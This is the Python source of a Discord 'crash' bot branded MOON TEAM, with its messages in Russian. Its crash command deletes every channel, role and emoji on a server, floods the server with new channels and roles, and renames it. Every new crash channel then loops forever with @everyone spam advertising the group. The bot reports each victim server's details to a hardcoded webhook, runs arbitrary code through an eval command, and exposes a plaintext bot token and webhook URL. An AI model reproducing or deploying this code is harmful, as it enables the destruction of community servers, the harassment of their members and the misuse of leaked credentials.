  # coding=utf-8
import time
import random
import asyncio
import os
import discord
import aiohttp
import json
import inspect
from discord.ext import commands
import datetime
import keep_alive
import threading
from discord_webhook import DiscordWebhook as hook, DiscordEmbed as D_Embed
from threading import Thread
from time import sleep
from discord import Webhook, AsyncWebhookAdapter
wl = [914094381219340340]
keep_alive.keep_alive()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix = 'h!', intents=intents)
bot.remove_command( 'help' )
black_list = json.load(open('black-list.json'))
bl_server = json.load(open('bl-server.json'))
ser_vers = json.load(open('servers.json'))


dev_ids = [483558478565343232,832986836019707904]

@bot.event
async def on_guild_join(guild):


  if guild.id in ser_vers:
        embed = discord.Embed(
            title = 'Попытка краша сервера из белого списка.',
            description = '''Согласно нашим данным это сервер пытались крашнуть. Мы советуем посмотреть журнал аудита и проверить кто пригласил этого бота. Если у вас есть вопросы, то **[🔗кликните наш Discord сервер](https://discord.gg/6SE3CcGQdx)**''',
            color = 0xe90000
        )
        await guild.text_channels[0].send(embed=embed)
        await guild.leave()
  adder=None
  try:
    async for entry in guild.audit_logs(action=discord.AuditLogAction.bot_add):
      adder = entry.user
      a_id=adder.id
      break
    if a_id in black_list:
      try: await adder.send("https://discord.gg/6nTt9AvKKv ", embed = discord.Embed(title=':x:Доступ запрещен. Вас добавили в черный список', description=f'```Вы можете зайти на сервер, чтобы узнать причину блокировки```', colour = 0xf00a0a))
      except: pass
      await guild.leave()
      return
  except: adder="Unknown"; a_id="Unknown"
  async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url('https://discord.com/api/webhooks/971097497487442000/vZ6jWw9dOPM4HHYCIH-0ggBwXjLQp90_pW02OfQyF47YJrifHK2rfFLsNFO_gt6X78I3', adapter=discord.AsyncWebhookAdapter(session))
        members = len(guild.members)
        await webhook.send(embed=discord.Embed(
            title="Новый сервер!",
            description=(
                f"**Название перед крашем:** `{guild.name}`\n"
                f"**Добавил краш бота:** <@{a_id}> **Его айди** `{a_id}` \n"
                f"**Инфо перед крашем:**\n"
                f"**Участников:** `{guild.member_count}`\n"
                f"**Ролей:** `{str(len(guild.roles))}` \n"
                f"**Каналов:** `{str(len(guild.channels))}` \n"
                f"**Владелец:** `{guild.owner}` **Его айди:** `{guild.owner.id}`\n"
                f"**ID сервера:** `{guild.id}`\n"
                f"**Пригласить бота:** `Ссылка` [Нажмите для добавления](https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot) **Бот в этом канале** <#969571626930819119>\n"
                f"**Уничтожено серверов этим ботом:** `{len(bot.guilds)}` \n"
                f"**Все сервера отображаются | jktimosha**"
            ),
            color=discord.Color.red()
        ).set_thumbnail(url=guild.icon_url_as(static_format="png", size=1024)))

@bot.command()
@commands.cooldown(1, 300, commands.BucketType.user) 
async def crash(ctx):
	a = 0
	b = 0
	c = 0
	d = 0
	e = 0
	for x in ctx.guild.channels:
		a += 1
		try: await x.delete()
		except: pass
	for x in ctx.guild.roles:
		b += 1
		try: await x.delete()
		except: pass
	for x in ctx.guild.emojis:
		d += 1
		try: await x.delete()
		except: pass
	for x in range(100):
		await ctx.guild.create_text_channel(name="Crashed by MOON TEAM")
		c += 1
	for x in range(100):
		e += 1
		await ctx.guild.create_role(name ="Crashed by MOON TEAM")
		guild = ctx.message.guild
		await guild.edit(name="Crashed by MOON TEAM")
	async with aiohttp.ClientSession() as session:
		webhook = discord.Webhook.from_url('https://discord.com/api/webhooks/971097497487442000/vZ6jWw9dOPM4HHYCIH-0ggBwXjLQp90_pW02OfQyF47YJrifHK2rfFLsNFO_gt6X78I3', adapter=discord.AsyncWebhookAdapter(session))
		await webhook.send(embed=discord.Embed(
			title=f"Сервер сверху уничтожен",
            description=(
                f"**💥 | Удалено каналов:** `{a}`\n"
                f"**💥 | Удалено ролей:** `{b}` \n"
                f"**:space_invader: | Создано текстовых каналов:** `{c}`\n"
                f"**:space_invader: | Создано ролей:** `{e}` \n"
                f"** 💥 | Удалено эмодзи:** `{d}`||(Если 0, то их не было)|| \n"
                f"**:link: | Пригласить бота:** `Ссылка` [Нажмите для добавления](https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot) **Подробная информация в этом канале ** <#969571626930819119>\n"
                f"**:busts_in_silhouette: | Участников**: `{ctx.guild.member_count}`\n"
                f"**:dart: | Ролей:** `{str(len(ctx.guild.roles))}` \n"
                f"**:computer: | Каналов:** `{str(len(ctx.guild.channels))}` \n"
                f"**:skull: | Крашер:** <@{ctx.author.id}> **Его айди:** `{ctx.author.id}`\n"
                f"**:id: | ID сервера**: `{ctx.guild.id}`\n"
                f"**:red_circle: | Статус:** `Уничтожен` \n"
                f"**💣 | Уничтожено серверов этим ботом:** `{len(bot.guilds)}`\n"
                f"**Все сервера отображаются | JKtimosha**"
            ),
            color=discord.Color.red()
            ))
@bot.command()
async def bl(ctx, param, id: int):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("Долбаеб", embed = discord.Embed(title=':x:Доступ запрещен', description=f'```Ты не разработчик этого творения```', colour = 0xf00a0a))
  if param == "add":
    black_list.append(id)
    await ctx.send(f"<@{id}> был добавлен в черный список боты,**Мой сладкий пончик**!", embed = discord.Embed(title='✅', description=f'Хорошего дня {ctx.author}!', colour = 0xf00a0a))
  elif param == "remove":
    black_list.remove(id)
    await ctx.send(f"<@{id}> был убран", embed = discord.Embed(title='✅', description=f'```Хорошего дня``` \n `{ctx.author.mention}`!', colour = 0xf00a0a))
  with open('black-list.json', 'w') as f: json.dump(black_list, f)

@bot.command()
async def wl(ctx, param, id: int):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("Долбаеб", embed = discord.Embed(title=':x:Доступ запрещен', description=f'```Ты не разработчик этого творения```', colour = 0xf00a0a))
  if param == "add":
    ser_vers.append(id)
    await ctx.send(f"Сервер с айди `{id}` был добавлен в защиту", embed = discord.Embed(title='✅', description=f'Хорошего дня {ctx.author.mention}!', colour = 0xf00a0a))
  elif param == "remove":
    ser_vers.remove(id)
    await ctx.send(f"Сервер с {id} был убран", embed = discord.Embed(title='✅', description=f'Хорошего дня {ctx.author.mention}!', colour = 0xf00a0a))
  with open('servers.json', 'w') as f: json.dump(ser_vers, f)
@bot.event
async def on_guild_channel_create(channel):
    if channel.name == "crashed-by-moon-team":
      print("test")
      webhook = await channel.create_webhook(name = "Crash by JK Crashers")
    print("test2")
    webhook_url = webhook.url
    async with aiohttp.ClientSession() as session:
      print("test3")
      webhook = discord.Webhook.from_url(str(webhook_url), adapter=discord.AsyncWebhookAdapter(session))
      print("test4")
      while True:
        try:
          await webhook.send("💌 @everyone @here \n Вас крашнули https://discord.gg/6nTt9AvKKv ", embed = discord.Embed(title=' ', description=f'**Хочешь крашить сервера?** \n **Тогда тебе точно к нам!**\n `MOON TEAM` __даст вам:__ \n ```-Удобных и мощных краш ботов. \n-Помощь с рейдом и крашем. \n-Большой функционал краш ботов.``` \n **Наши социальные сети** \n `Дискорд сервер` [🔗Клик](https://discord.gg/6nTt9AvKKv) \n `Telegram канал` [🔗Клик](https://t.me/jkcrashers) \n`Youtube создателя` [🔗Клик](https://www.youtube.com/c/JKTimosha)', colour = 0x210303))
        except:
          pass

@bot.event
async def on_command_error(ctx, err):
    if isinstance(err, commands.errors.BotMissingPermissions):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"У бота отсутствуют права: {' '.join(err.missing_perms)}\nВыдайте их ему для полного функционирования бота", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandOnCooldown):
        await ctx.message.delete()
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"**У вас еще не прошел кулдаун на команду** `{ctx.command}`\n**Подождите еще** \n  ```{err.retry_after:.2f} секунд```", color=discord.Colour.from_rgb(255, 0, 0)))
    elif isinstance(err, commands.CommandNotFound ):
        await ctx.send(embed = discord.Embed(description = f'** {ctx.author.name}, данной команды не существует.**', color=0x0c0c0c))
    elif isinstance( err, commands.MissingRequiredArgument ):
        await ctx.author.send(embed=discord.Embed(title='Ошибочка', description=f"Нету аргумента", color=discord.Colour.from_rgb(255, 0, 0)))

@bot.command(name="eval")
async def _eval(ctx, *, command):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("**Долбаеб!!!**", embed = discord.Embed(title=':x:Доступ запрещен', description=f'Ты не разработчик -_-', colour = 0xf00a0a))
  res = eval(command)
  if inspect.isawaitable(res):
    await ctx.send(await res)
  else:
    await ctx.send(res)

@bot.command(brief = "private", description = "Создаёт приглашение, и отправляет его")
async def invite(ctx=None, id=None):
  global dev_ids
  if not ctx.author.id in dev_ids:
    return await ctx.send("нельзя")
  g = bot.get_guild(int(id))
  if not g: return await ctx.send('В моей базе данных нету такого сервера')
  for x in g.text_channels:
      link = await x.create_invite(max_age=1, max_users=2)
      link = str(link)
      await ctx.send(link)
      return link
      await ctx.send(f'Нет прав для создания инвайта ')


@bot.event
async def on_ready():
  print(f'Бот запущен. Ник бота: {bot.user}  https://discord.com/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot Юзеров {0}!'.format(bot.user))
  await bot.change_presence(status=discord.Status.online, activity=discord.Streaming(name=f'Hack by Hydra | MOON TEAM', url='https://www.twitch.tv/jktimosha'))








bot.run("OTczOTY4MzU5NDUwMzU3ODEx.GqWF1S.bWvt2ouK-fCD9e1MgfFAT7fUDj3BZBGqDvKp2Y")
